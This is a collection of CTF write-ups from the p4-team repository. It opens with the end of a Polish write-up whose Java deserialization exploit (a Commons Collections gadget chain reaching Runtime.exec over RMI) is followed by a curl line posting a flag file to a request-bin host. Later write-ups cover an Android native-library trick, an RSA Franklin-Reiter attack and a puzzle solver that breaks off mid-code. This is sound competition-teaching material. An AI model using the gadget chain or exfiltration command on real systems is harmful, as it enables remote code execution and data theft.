  public String toString() {\n        String str = super.toString();\n        if (!this.content.isEmpty()) {\n            str = str + \" that contains: \\n\" + this.content.toString().replace(\":\", \"x \").replace(',', '\\n');\n        }\n        return str;\n    }\n}\n```\n\nPodatność w tym zadaniu polega na tym, że serwer musi zdeserializować obiekty które mu przesyłamy.\nPóźniej może to wysypać program z `ClassCastException` jeśli wyślemy obiekty nieoczekiwanego typu, ale mimo wszystko muszą zostać zdeserializowane.\nWarto pamiętać też że Java nie ma na poziomie wykonania czegoś takiego jak typy generyczne.\nKażda kolekcja obiektów może przechowywać obiekty dowolnych, niezwiązanych ze sobą, typów.\nTo oznacza że w obiekcie `HashBag` w klasie `Hat` możemy przechowywać cokolwiek.\n\nUżyliśmy lekko zmodyfikowanego payloadu z [ysoserial](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java).\nUżywamy tego samego podejścia ale zamiast `HashSet` tworzmy `HashBag`. \nUżywamy też `Whitebox` żeby pozbyć się całego szaleństwa związanego z refleksją.\n\n```java\nprivate static Hat preparePayload(String command) {\n\t// like in CommonsCollections6\n\tString[] execArgs = new String[]{command};\n\tTransformer[] transformers = new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, execArgs), new ConstantTransformer(1)};\n\tTransformer transformerChain = new ChainedTransformer(transformers);\n\tMap innerMap = new HashMap();\n\tMap lazyMap = LazyMap.decorate(innerMap, transformerChain);\n\tTiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\");\n\tHashBag bagWithExploit = new HashBag();\n\tbagWithExploit.add(new Object());\n\n\tMap internalMap = Whitebox.getInternalState(bagWithExploit, \"map\");\n\tObject[] nodesArray = Whitebox.getInternalState(internalMap, \"table\");\n\tObject node = Arrays.stream(nodesArray)\n\t\t\t.filter(Objects::nonNull)\n\t\t\t.findFirst()\n\t\t\t.orElseThrow(() -> new RuntimeException(\"this can't happen\"));\n\tWhitebox.setInternalState(node, \"key\", entry);\n\n\tHat hat = new Hat();\n\tWhitebox.setInternalState(hat, \"content\", bagWithExploit);\n\treturn hat;\n}\n```\n\nTak przygotowany `hat` możemy teraz wysłać do serwera, co spowoduje wykonanie `command`.\nUruchamiamy ten exploit przez:\n\n```java\n    public static void main(final String[] args) throws Exception {\n        Properties props = System.getProperties();\n        props.setProperty(\"javax.net.ssl.trustStore\", \"magic_hat_truststore\");\n        props.setProperty(\"javax.net.ssl.trustStorePassword\", \"magic_hat\");\n        Registry registry = LocateRegistry.getRegistry(InetAddress.getByName(\"magichat.teaser.insomnihack.ch\").getHostName(), 51966, new SslRMIClientSocketFactory());\n        WizardAPI wizard = (WizardAPI) registry.lookup(\"Wizard\");\n        Scanner sc = new Scanner(System.in);\n        while (true) {\n            System.out.print(\"> \");\n            execCommand(wizard, sc.nextLine());\n        }\n    }\n\n    private static void execCommand(WizardAPI wizard, String command) {\n        try {\n            wizard.castASpell(preparePayload(command));\n        } catch (Exception e) {\n        }\n    }\n```\n\nW ten sposób mamy generalnie RCE na serwerze, chociaż bez echa, ale możemy zawsze uruchomić sobie reverse-shell.\nPo chwili rozglądania się po serwerze znajdujemy plik `flag.txt` w `/home/magic-hat` i możemy pobrać go przez:\n\n`curl -d @/home/magic-hat/flag.txt -X POST https://requestb.in/blablabla`\n\nDostajemy: `INS{lol_ur_a_lizard_Gary!}`\n", "timestamp": "2025-10-21T13:32:05.312771"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-02-03-codegate-quals/re_droid/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-02-03-codegate-quals/re_droid/README.md", "content": "# Welcome to droid (Re, 635p, 24 solved)\n\n[PL](#pl-version)\n\nIn the task we get [android application](droid.apk) to work with.\nOnce we reverse the sources, it seems we need to pass some checks to reach the flag.\nHowever one of the checks is:\n\n```java\npublic String m4832k() {\n\tchar[] cArr = new char[]{'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};\n\tStringBuffer stringBuffer = new StringBuffer();\n\tRandom random = new Random();\n\tfor (int i = 0; i < 20; i++) {\n\t\tstringBuffer.append(cArr[random.nextInt(cArr.length)]);\n\t}\n\treturn stringBuffer.toString();\n}\n```\n\nAnd sice it's using random values, it's very unlikely we can pass it.\nWe could try to patch the code, but it's a lot of fuss.\nIf we could pass all the checks the code that shows the flag is:\n\n```java\nthis.f3092l = (EditText) findViewById(R.id.editText);\nthis.f3092l.setText(stringFromJNI());\n```\n\nSo it calls a single function from the native library shipped with the app.\nThe function is pretty much unreversable, way to complex, but we don't need that.\nWe can simply load this library and call the function, without all silly checks!\n\nIn order to do that we create a new android project (we actually used NDK example) with Android Studio, create a new Activity, but keeping all the names and packages the same, and write code:\n\n```java\npackage com.example.puing.a2018codegate;\n\nimport android.support.v7.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.widget.TextView;\n\nimport java.util.logging.Logger;\n\npublic class Main4Activity extends AppCompatActivity {\n    static {\n        System.loadLibrary(\"hello-libs\");\n    }\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        TextView tv = new TextView(this);\n        String flagString = stringFromJNI();\n        tv.setText(flagString);\n        setContentView(tv);\n        Logger.getLogger(\"flagLogger\").info(flagString);\n    }\n\n    public native String stringFromJNI();\n}\n```\n\nWe modify the build.gradle for libs to include our .so files:\n\n```\nsourceSets {\n\tmain {\n\t\t// let gradle pack the shared library into apk\n\t\tjniLibs.srcDirs = ['../distribution/gperf/lib', '../distribution/droid/lib']\n\t}\n}\n```\n\nAnd we're good to go.\nWe can just run the app and get:\n\n![](flag.png)\n\nSo the flag is: `FLAG{W3_w3r3_Back_70_$3v3n7een!!!}`\n\n### PL version\n\nW zadaniu dostajemy [aplikację androidową](droid.apk).\nPo zdekompilowaniu i analizie źródeł widać, że musimy przejść kilka testów żeby dostać flagę.\nNiestety jeden z nich to:\n\n```java\npublic String m4832k() {\n\tchar[] cArr = new char[]{'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};\n\tStringBuffer stringBuffer = new StringBuffer();\n\tRandom random = new Random();\n\tfor (int i = 0; i < 20; i++) {\n\t\tstringBuffer.append(cArr[random.nextInt(cArr.length)]);\n\t}\n\treturn stringBuffer.toString();\n}\n```\n\nA skoro używa losowych wartości to jest mała szansa że uda się go przejść.\nMoglibyśmy spróbować patchować ten kod, ale to dużo roboty.\nGdybyśmy przeszli testy to za wyświetlenie flagi odpowiada:\n\n```java\nthis.f3092l = (EditText) findViewById(R.id.editText);\nthis.f3092l.setText(stringFromJNI());\n```\n\nWięc wołana jest jedna funkcja z natywnej biblioteki dostarczonej z aplikacją.\nSama funkcja jest praktycznie nie do zreversowania, zbyt skomplikowana, ale nie musimy tego robić.\nMożemy po prostu załadować sobie tą bibliotekę i wywołać funkcje, bez żadnych testów!\n\nŻeby to zrobić stworzyliśmy nowy projekt androidowy (użyliśmy jako szablonu przykładowego kodu z NDK) w Android Studio, stworzyliśmy własne Activity, pozostawiając takie same nazwy klas i pakietów i napisaliśmy kod:\n\n```java\npackage com.example.puing.a2018codegate;\n\nimport android.support.v7.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.widget.TextView;\n\nimport java.util.logging.Logger;\n\npublic class Main4Activity extends AppCompatActivity {\n    static {\n        System.loadLibrary(\"hello-libs\");\n    }\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        TextView tv = new TextView(this);\n        String flagString = stringFromJNI();\n        tv.setText(flagString);\n        setContentView(tv);\n        Logger.getLogger(\"flagLogger\").info(flagString);\n    }\n\n    public native String stringFromJNI();\n}\n```\n\nMusieliśmy też zmodyfikować build.gradle dla bibliotek, żeby uwzględnić nasze pliki .so:\n\n```\nsourceSets {\n\tmain {\n\t\t// let gradle pack the shared library into apk\n\t\tjniLibs.srcDirs = ['../distribution/gperf/lib', '../distribution/droid/lib']\n\t}\n}\n```\n\nI pozostało już tylko uruchomić aplikację i dostać:\n\n![](flag.png)\n\nWięc flaga to `FLAG{W3_w3r3_Back_70_$3v3n7een!!!}`\n", "timestamp": "2025-10-21T13:32:06.192871"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-03-10-n1ctf/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-03-10-n1ctf/README.md", "content": "# N1 CTF 2018\n\nTeam: borysp, nazywam, eternal, chivay, shalom, ppr, pwn.m0d3, akrasuski1, msm, sasza\n\n### Table of contents\n\n* [Patience (re)](re_patience)\n* [Mathgame (ppc)](ppc_mathgame)\n* [rsa padding (crypto)](crypto_rsapadding)\n", "timestamp": "2025-10-21T13:32:06.776209"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-03-10-n1ctf/crypto_rsapadding/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-03-10-n1ctf/crypto_rsapadding/README.md", "content": "# Rsa padding (Crypto, 303p, 47 solved)\n\nIn the task we can connect to a netcat service which gives us the crypto source code:\n\n```python\n#!/usr/bin/env python3\n# -*- coding=utf-8 -*-\n\nfrom Crypto.Util.number import getPrime, GCD, bytes_to_long\nfrom hashlib import sha256\nimport random\nimport signal\nimport sys, os\n\nsignal.alarm(20)\n\nm = b\"xxxxxxxxxxxxxx\"\nn = 21727106551797231400330796721401157037131178503238742210927927256416073956351568958100038047053002307191569558524956627892618119799679572039939819410371609015002302388267502253326720505214690802942662248282638776986759094777991439524946955458393011802700815763494042802326575866088840712980094975335414387283865492939790773300256234946983831571957038601270911425008907130353723909371646714722730577923843205527739734035515152341673364211058969041089741946974118237091455770042750971424415176552479618605177552145594339271192853653120859740022742221562438237923294609436512995857399568803043924319953346241964071252941\ne = 3\n\ndef welcom():\n    batch = \"\"\"\n _   _      __ _         _____ _______ ______  \n| \\ | |    /_ | |       / ____|__   __|  ____| \n|  \\| |_   _| | |      | |       | |  | |__    \n| . ` | | | | | |      | |       | |  |  __|   \n| |\\  | |_| | | |____  | |____   | |  | |      \n|_| \\_|\\__,_|_|______|  \\_____|  |_|  |_|      \n\n_|_|_|      _|_|_|    _|_|          _|_|_|    _|_|    _|      _|  _|_|_|_|  \n_|    _|  _|        _|    _|      _|        _|    _|  _|_|  _|_|  _|        \n_|_|_|      _|_|    _|_|_|_|      _|  _|_|  _|_|_|_|  _|  _|  _|  _|_|_|    \n_|    _|        _|  _|    _|      _|    _|  _|    _|  _|      _|  _|        \n_|    _|  _|_|_|    _|    _|        _|_|_|  _|    _|  _|      _|  _|_|_|_|                        \n\"\"\"\n    print(batch)\n\ndef proof():\n    strings = \"abcdefghijklmnopqrstuvwxyzWOERFJASKL\"\n    prefix = \"\".join(random.sample(strings, 6))\n    starwith = str(random.randint(10000, 99999))\n    pf = \"\"\"\nsha256(\"%s\"+str).hexdigest().startswith(\"%s\") == True\nPlease give me str\n\"\"\"%(prefix, starwith)\n    print(pf)\n    s = input().strip()\n    if sha256((prefix+s).encode()).hexdigest().startswith(starwith):\n        return True\n    else:\n        return False\n\ndef cmd():\n    help = \"\"\"\n1. get code\n2. get flag\nPlease tell me, what you want?\n\"\"\"\n    while True:\n        print(help)\n        c = input().strip()\n        if c == \"1\":\n            return True\n        elif c == \"2\":\n            return False\n        else:\n            print(\"Enter Error!\")\n\ndef main():\n    if not proof():\n        print(\"Check Failed!\")\n        return\n    welcom()\n    if cmd():\n        f = open(\"file.py\")\n        print(f.read())\n        return\n    mm = bytes_to_long(m)\n    assert pow(mm, e) != pow(mm, e, n)\n    sys.stdout.write(\"Please give me a padding: \")\n    padding = input().strip()\n    padding = int(sha256(padding.encode()).hexdigest(),16)\n    c = pow(mm+padding, e, n)\n    print(\"Your Ciphertext is: %s\"%c)\n\nif __name__ == '__main__':\n    main()\n```\n\nThe only important part is:\n\n```python\nn = 21727106551797231400330796721401157037131178503238742210927927256416073956351568958100038047053002307191569558524956627892618119799679572039939819410371609015002302388267502253326720505214690802942662248282638776986759094777991439524946955458393011802700815763494042802326575866088840712980094975335414387283865492939790773300256234946983831571957038601270911425008907130353723909371646714722730577923843205527739734035515152341673364211058969041089741946974118237091455770042750971424415176552479618605177552145594339271192853653120859740022742221562438237923294609436512995857399568803043924319953346241964071252941\ne = 3\n###\n###\nsys.stdout.write(\"Please give me a padding: \")\npadding = input().strip()\npadding = int(sha256(padding.encode()).hexdigest(),16)\nc = pow(mm+padding, e, n)\nprint(\"Your Ciphertext is: %s\"%c)\n```\n\nWe can give some string input, the script will calculate sha256 from it, add to the flag and then RSA encrypt.\nThis is a textbook example for Franklin-Reiter related message attack, so we run a solver for it:\n\n```python\nimport hashlib\n\ndef chunk(input_data, size):\n    return [input_data[i:i+size] for i in range(0, len(input_data), size)]\n\ndef long_to_bytes(data):\n    data = int(data)\n    data = hex(data).rstrip('L').lstrip('0x')\n    if len(data) % 2 == 1:\n        data = '0' + data\n    return bytes(bytearray(int(c, 16) for c in chunk(data, 2)))\n\ndef gcd(a, b): \n    while b:\n        a, b = b, a % b\n    return a.monic()\n\ndef franklin(n, pad1, pad2, c1, c2):\n    R.<X> = PolynomialRing(Zmod(n))\n    f1 = (X + pad1)^3 - c1\n    f2 = (X + pad2)^3 - c2\n    return -gcd(f1, f2).coefficients()[0]\n\ndef main():\n    n = 21727106551797231400330796721401157037131178503238742210927927256416073956351568958100038047053002307191569558524956627892618119799679572039939819410371609015002302388267502253326720505214690802942662248282638776986759094777991439524946955458393011802700815763494042802326575866088840712980094975335414387283865492939790773300256234946983831571957038601270911425008907130353723909371646714722730577923843205527739734035515152341673364211058969041089741946974118237091455770042750971424415176552479618605177552145594339271192853653120859740022742221562438237923294609436512995857399568803043924319953346241964071252941\n    pad1 = int(hashlib.sha256(\"1\").hexdigest(),16)\n    pad2 = int(hashlib.sha256(\"2\").hexdigest(),16)\n    c1 = 14550589053226237723784378782911157204367764723813789158271625147472004207734354619642445255036997940341703539883653916130592718879734436263217819317202435434496341973502556894834798718992952369685841347018901038478081710519253844078907000973324354805502890255414196801758171762906898874914776720897920729518384393581853690034053515213192846817920534901501370942556249012415259244063185938984570137371682805276444650716010228924732495062415330875872004691866847132147232457398743319930259327973290858489741376000333603734294893832124907092640953321640151851853501528390729805151850605432707293088635480863375398001441\n    c2 = 14550589053226237723784378782911157204367764723816957959635387925652898370034365455451983914571405062459535687617841302966938233065296973978472553109061974458935966754832788411876301179210585984208608247433383774246743661884093657109502619626436726032508763685599880808525861655167503719155953736308920858354069083437923495143680174206534169208623366776314544036377265501358254923029291010047210371394197963442022610746743020719292018028518885149189744832788117626194748311114409968846879212425054195323473068436359069318372735069308398135560733890706617536127579272964863500568572120716434126233695562326533941909353\n    result = franklin(n, pad1, pad2, c1, c2)\n    print(long_to_bytes(result))\n\nmain()\n```\n\nAnd get: `N1CTF{f7efbf4e5f5ef78ca1fb9c8f5eb02635}`\n", "timestamp": "2025-10-21T13:32:07.033802"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-03-10-n1ctf/ppc_mathgame/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-03-10-n1ctf/ppc_mathgame/README.md", "content": "# Mathgame (PPC, 714p, 9 solved)\n\nThis was a very annoying task.\nConceptually it was actually pretty simple, but parsing the input was hard, and then it was randomly failing tests.\nThe idea was that we have a cube 7x7x7 with numbers on the walls.\nThere are 7 numbers which doesn't fit somehow.\nWe need to find them, then connect them via lines, and two of such lines will be perpendicular and cross an internal cube.\nThe task is to give coordinates of this internal cube.\n\nIt was not clear if the cube coordinates are counted from the middle or some other point, and also how to count intersection going through a wall.\nThere were also test cases which had multiple solutions, or no solutions at all.\nFortunately we had to solve only 5 examples to get the flag, so we simply run this in a loop for a while to get the flag.\n\nThe special numbers could be found with rules:\n1. even/odd\n2. even/odd\n3. primes/non-primes\n4. primes/non-primes\n5. 3 divisors / 2 divisors\n\nThe input was in form:\n\n```\n=================================================================================\n                                Question Five\n=================================================================================\n\n                                      A\n------------------------------------------------------------------------------\n\n|1328790233|2084499161|0696287693|1660138603|1157298553|2588563183|2357964443|\n------------------------------------------------------------------------------\n|3726747287|1521033083|3839283769|1661498821|1898692387|3135736403|1658923543|\n------------------------------------------------------------------------------\n|2326824881|2777671103|3099882481|2279475533|1765911347|2687755193|0339175751|\n------------------------------------------------------------------------------\n|1490623237|2618039657|1878850373|2081800027|1659998141|0532226311|1513689113|\n------------------------------------------------------------------------------\n|2003621209|3193816697|2664061769|3118907131|1743603311|1892309323|2909118241|\n------------------------------------------------------------------------------\n|2090511169|2726139389|2928378703|1563046193|2501788909|3227850023|3516251579|\n------------------------------------------------------------------------------\n|2331864553|1753491527|2239852117|2874087743|2656404403|2457493267|1891677913|\n------------------------------------------------------------------------------\n\n******************************************************************************\n                                      B\n------------------------------------------------------------------------------\n|2357964443|3212428841|0432400201|1580443153|2362281367|2042152669|2248772021|\n------------------------------------------------------------------------------\n|1658923543|2238017741|2486241403|2087206861|3573698417|1884731227|2660729209|\n------------------------------------------------------------------------------\n|0339175751|1984116557|3212739667|1630709579|2630303411|1126220239|2723978393|\n------------------------------------------------------------------------------\n|1513689113|2379249491|2462656099|3278529689|3248454709|2452096897|1989718651|\n------------------------------------------------------------------------------\n|2909118241|2362922879|2319001897|3664496333|0287807791|2539914877|2944262089|\n------------------------------------------------------------------------------\n|3516251579|2069603141|2929374769|3001367287|3552535627|1737077239|2920954321|\n------------------------------------------------------------------------------\n|1891677913|1897008599|1607466241|2258608613|2605621531|2357919709|1621511029|\n------------------------------------------------------------------------------\n\n******************************************************************************\n                                      C\n------------------------------------------------------------------------------\n|2248772021|2042152669|2362281367|1580443153|0432400201|3212428841|2357964443|\n------------------------------------------------------------------------------\n|2556179783|3083582137|2823299807|2982382943|2470982513|3766208269|2588563183|\n------------------------------------------------------------------------------\n|1279701343|1349891281|1631377337|2223472201|3043595761|3980677397|1157298553|\n------------------------------------------------------------------------------\n|2519143849|1332811691|3405530693|1462403983|3398349961|1933290613|1660138603|\n------------------------------------------------------------------------------\n|2881715209|2137626649|3365750909|1639321561|2501250923|1445581847|0696287693|\n------------------------------------------------------------------------------\n|3143410783|2063116669|3486766021|3058422299|3729039467|2252837863|2084499161|\n------------------------------------------------------------------------------\n|1338974471|4189292929|1755308323|3608715713|1160079631|3367242341|1328790233|\n------------------------------------------------------------------------------\n\n******************************************************************************\n                                      D\n------------------------------------------------------------------------------\n|3235114681|2471203951|2709782587|1933809511|3129277721|2236589099|2331864553|\n------------------------------------------------------------------------------\n|2084508749|1206882367|1730418379|2182678481|1381552729|3469818697|1753491527|\n------------------------------------------------------------------------------\n|2832238313|2263125911|0480393457|2030207351|1893967217|2298743639|2239852117|\n------------------------------------------------------------------------------\n|1605350543|2398724927|2366655829|1861475303|1679976917|1588881649|2874087743|\n------------------------------------------------------------------------------\n|1949274161|3335731237|1715264021|2556690923|1572620113|1420979311|2656404403|\n------------------------------------------------------------------------------\n|1904118701|0809915627|1563823619|2756629699|4045257421|1755318067|2457493267|\n------------------------------------------------------------------------------\n|1621511029|2357919709|2605621531|2258608613|1607466241|1897008599|1891677913|\n------------------------------------------------------------------------------\n\n******************************************************************************\n                                      E\n------------------------------------------------------------------------------\n|2248772021|2556179783|1279701343|2519143849|2881715209|3143410783|1338974471|\n------------------------------------------------------------------------------\n|2660729209|2208808709|2137179923|3467495971|2369408329|1417842847|2856461851|\n------------------------------------------------------------------------------\n|2723978393|2388231823|2931564319|3317731211|1993509377|2169053221|2057817481|\n------------------------------------------------------------------------------\n|1989718651|2251635973|1901557607|2165696801|3295570127|2353890053|2191693367|\n------------------------------------------------------------------------------\n|2944262089|2421919121|2310049853|3799873817|1785808949|2212685389|3431625541|\n------------------------------------------------------------------------------\n|2920954321|1548928189|1857980479|2371731689|2683816601|2536769041|3050435657|\n------------------------------------------------------------------------------\n|1621511029|1904118701|1949274161|1605350543|2832238313|2084508749|3235114681|\n------------------------------------------------------------------------------\n\n******************************************************************************\n                                      F\n------------------------------------------------------------------------------\n|1338974471|4189292929|1755308323|3608715713|1160079631|3367242341|1328790233|\n------------------------------------------------------------------------------\n|2856461851|1830343831|2803179479|2540555291|1596370583|2428756193|3726747287|\n------------------------------------------------------------------------------\n|2057817481|1993397429|2212281713|2762599291|2213126341|2536883941|2326824881|\n------------------------------------------------------------------------------\n|2191693367|2253085969|2802701081|2338219649|1366065193|2054382947|1490623237|\n------------------------------------------------------------------------------\n|3431625541|2143610489|3419371091|2646546713|2317498357|2439885193|2003621209|\n------------------------------------------------------------------------------\n|3050435657|3676301219|3598318393|2810755349|3005050121|2401101617|2090511169|\n------------------------------------------------------------------------------\n|3235114681|2471203951|2709782587|1933809511|3129277721|2236589099|2331864553|\n------------------------------------------------------------------------------\n\n******************************************************************************\nUse A to create a coordinate system(z == 0)\n\n6^y\n |\n |\n |         x\n |__________>\n0           6\n```\n\nThe solver code:\n\n```python\nimport hashlib\nimport itertools\nimport re\nimport string\nfrom gmpy2 import is_prime\n\nimport numpy\n\nfrom crypto_commons.generic import get_primes, factor_p\nfrom crypto_commons.netcat.netcat_commons import nc, receive_until_match, send, interactive\n\n\ndef PoW(challenge):\n    data = re.findall('\"(.*?)\"', challenge)\n    prefix = data[0]\n    result = data[1]\n    for s in itertools.product(string.printable, repeat=4):\n        st = \"\".join(s)\n        if hashlib.sha256(prefix + st).hexdigest().startswith(result):\n            return st\n    return \"dupa\"\n\n\ndef parse_data(question_data):\n    numbers = re.findall('\\d+', question_data)\n    numbers = map(int, numbers[:-4])\n\n    def chunks(l, n):\n        \"\"\"Yield successive n-sized chunks from l.\"\"\"\n        for i in range(0, len(l), n):\n            yield l[i:i + n]\n\n    def find_match(a, b):\n        for x1, x2 in enumerate(a):\n            for y1, y2 in enumerate(b):\n                if x2 == y2:\n                    return (x1, y1)\n        return None\n\n    DIRECTIONS = {\n        0: \"UP\",\n        1: \"RIGHT\",\n        2: \"DOWN\",\n        3: \"LEFT\"\n    }\n\n    sides = chunks(numbers, len(numbers) / 6)\n\n    class Face():\n\n        def __init__(self, cubes):\n            print(\"CONSTRUCTOR\")\n            self.cubes = list(reversed(list(chunks(cubes, 7))))\n            self.hashes = []\n\n            self.position = -1\n            self.calculate_hashes()\n\n        def calculate_hashes(self):\n            self.hashes = []\n\n            hash_up = 0\n            for i in range(7):\n                hash_up ^= self.cubes[0][i]\n\n            hash_right = 0\n            for i in range(7):\n                hash_right ^= self.cubes[i][6]\n\n            hash_down = 0\n            for i in range(7):\n                hash_down ^= self.cubes[6][i]\n\n            hash_left = 0\n            for i in range(7):\n                hash_left ^= self.cubes[i][0]\n\n            self.hashes.append(hash_up)\n            self.hashes.append(hash_right)\n            self.hashes.append(hash_down)\n            self.hashes.append(hash_left)\n\n        def turn_clockwise(self):\n            print(\"Turn\")\n            length = len(self.cubes) - 1\n\n            for i in range(length / 2):\n                for j in range(i, length - i):\n                    tmp = self.cubes[i][j]\n\n                    self.cubes[i][j] = self.cubes[length - j][i]\n                    self.cubes[length - j][i] = self.cubes[length - i][length - j]\n                    self.cubes[length - i][length - j] = self.cubes[j][length - i]\n                    self.cubes[j][length - i] = tmp\n\n            self.calculate_hashes()\n\n        def print_face(self):\n            for i in range(len(self.cubes)):\n                print(' '.join([str(x) for x in self.cubes[i]]))\n            print()\n\n    faces = []\n    for side in sides:\n        f = Face(side)\n        faces.append(f)\n\n    A = faces[0]\n    SIDES = [None] * 4\n    TOP = None\n\n    for f in faces[1:]:\n        print(\"new face\")\n        try:\n            a_pos, f_pos = find_match(A.hashes, f.hashes)\n            print(DIRECTIONS[a_pos], DIRECTIONS[f_pos])\n\n            SIDES[a_pos] = f\n\n            while a_pos != (f_pos + 2) % 4:\n                f.turn_clockwise()\n                a_pos, f_pos = find_match(A.hashes, f.hashes)\n                print(DIRECTIONS[a_pos], DIRECTIONS[f_pos])\n\n        except TypeError:\n            print(\"bee\")\n            TOP = f\n\n    # align top\n    UP_POS, TOP_pos = find_match(SIDES[0].hashes, TOP.hashes)\n    print(DIRECTIONS[UP_POS], DIRECTIONS[TOP_pos])\n\n    while UP_POS != (TOP_pos + 2) % 4:\n        TOP.turn_clockwise()\n        UP_POS, TOP_pos = find_match(SIDES[0].hashes, TOP.hashes)\n        print(DIRECTIONS[UP_POS], DIRECTIONS[TOP_pos])\n\n    cubes = {}\n\n    # process bottom\n    BOTTOM = A\n    print(\"Bottom\")\n    for i in range(7):\n        for j in range(7):\n            x = i\n            y = j\n            z = 0\n\n            if (x, y, z) in cubes:\n                assert cubes[(x, y, z)] == BOTTOM.cubes[j][i]\n            cubes[(x, y, z)] = BOTTOM.cubes[j][i]\n\n    ############################################################\n\n    BACK = SIDES[0]\n    print(\"Front\")\n    for i in range(7):\n        for j in range(7):\n            x = i\n            y = 0\n            z = 6 - j\n\n            if (x, y, z) in cubes:\n                assert cubes[(x, y, z)] == BACK.cubes[j][i]\n            cubes[(x, y, z)] = BACK.cubes[j][i]\n\n    ############################################################\n\n    RIGHT = SIDES[1]\n    print(\"Right\")\n    for i in range(7):\n        for j in range(7):\n            x = 6\n            y = j\n            z = i\n\n            if (x, y, z) in cubes:\n                assert cubes[(x, y, z)] == RIGHT.cubes[j][i]\n            cubes[(x, y, z)] = RIGHT.cubes[j][i]\n\n    ############################################################\n\n    FRONT = SIDES[2]\n    print(\"Back\")\n    for i in range(7):\n        for j in range(7):\n            x = i\n            y = 6\n            z = j\n\n            if (x, y, z) in cubes:\n                assert cubes[(x, y, z)] == FRONT.cubes[j][i]\n            cubes[(x, y, z)] = FRONT.cubes[j][i]\n\n    ############################################################\n\n    LEFT = SIDES[3]\n    print(\"Left\")\n    for i in range(7):\n        for j in range(7):\n            x = 0\n            y = j\n            z = 6 - i\n\n            if (x, y, z) in cubes:\n                assert cubes[(x, y, z)] == LEFT.cubes[j][i]\n            cubes[(x, y, z)] = LEFT.cubes[j][i]\n\n    ############################################################\n\n    TOP = TOP\n    print(\"Top\")\n    for i in range(7):\n        for j in range(7):\n            x = i\n            y = 6 - j\n            z = 6\n\n            if (x, y, z) in cubes:\n                assert cubes[(x, y, z)] == TOP.cubes[j][i]\n            cubes[(x, y, z)] = TOP.cubes[j][i]\n\n    print(len((filter(lambda x: x % 2 == 0, cubes.values()))))\n    print(cubes)\n    return cubes\n\n\ndef find_specials(matrix):\n    odds = list(filter(lambda x: x[1] % 2 == 1, matrix.items()))\n    print(len(odds))\n    if len(odds) == 7:\n        return odds\n    evens = list(filter(lambda x: x[1] % 2 == 0, matrix.items()))\n    print(len(evens))\n    if len(evens) == 7:\n        return evens\n    primes = list(filter(lambda x: is_prime(x[1]), matrix.items()))\n    print(len(primes))\n    if len(primes) == 7:\n        return primes\n    non_primes = list(filter(lambda x: is_prime(x[1]) is False, matrix.items()))\n    print(len(non_primes))\n    if len(non_primes) == 7:\n        return non_primes\n    primes = get_primes(1000000)\n    three_divisors = list(filter(lambda x: len(factor_p(x[1], primes, 100000)[0]) == 3, matrix.items()))\n    print(len(three_divisors))\n    if len(three_divisors) == 7:\n        return three_divisors\n    small = list(filter(lambda x: x[1] < 1000000000, matrix.items()))\n    print(len(small))\n    if len(small) == 7:\n        return small\n\n\ndef calculate_vector(start, end):\n    return end[0] - start[0], end[1] - start[1], end[2] - start[2]\n\n\ndef calculate_vectors(specials):\n    return [((points_pair[0], points_pair[1]), calculate_vector(points_pair[0], points_pair[1])) for points_pair in itertools.combinations(specials, 2)]\n\n\ndef dot_product(vector1, vector2):\n    return numpy.dot(vector1, vector2)\n\n\ndef find_intersection(line1, line2):\n    from shapely.geometry import LineString\n    A, B = line1\n    C, D = line2\n    line1 = LineString([A, B])\n    line2 = LineString([C, D])\n    result = line1.intersection(line2)\n    print('intersection', str(result))\n    if \"POINT Z\" in str(result):\n        return tuple(map(int, map(numpy.round, map(float, re.findall(\"(\\d+\\.?\\d*)\", str(result))))))\n    else:\n        return ()\n\n\ndef is_internal_cube(intersection):\n    return reduce(lambda x, y: x and y, [0 < intersection[i] < 6 for i in range(3)])\n\n\ndef find_perpendicular_crossing(points):\n    vectors = calculate_vectors(points)\n    intersections = set()\n    for vector_pair in itertools.combinations(vectors, 2):\n        vector1, vector2 = vector_pair\n        line1, v1 = vector1\n        line2, v2 = vector2\n        if v1 != v2 and line1[0] not in line2 and line1[1] not in line2:\n            product = dot_product(v1, v2)\n            if product == 0:\n                print('perpendicular vectors', line1, v1, line2, v2)\n                intersection = find_intersection(line1, line2)\n                if len(intersection) > 0 and intersection not in line1 and intersection not in line2 and is_internal_cube(intersection):\n                    intersections.add(intersection)\n    print('all internal intersections', intersections)\n    return list(intersections)[0]\n\n\ndef main():\n    while True:\n        try:\n            s = nc(\"47.75.60.212\", 11011)\n            data = receive_until_match(s, \"Please give me str\", None)\n            p = PoW(data)\n            send(s, p)\n            print(receive_until_match(s, \"you will get the flag.\", None))\n            while True:\n                x = receive_until_match(s, \"------------------------------------------------------------------------------\", None)\n                print(x)\n                question_data = receive_until_match(s, \"Please enter the coordinates of the answer:\", None)\n                print(question_data)\n                if \"N1CTF\" in x or \"N1CTF\" in question_data:\n                    interactive(s)\n                matrix = parse_data(question_data)\n                specials = find_specials(matrix)\n                print('specials', specials)\n                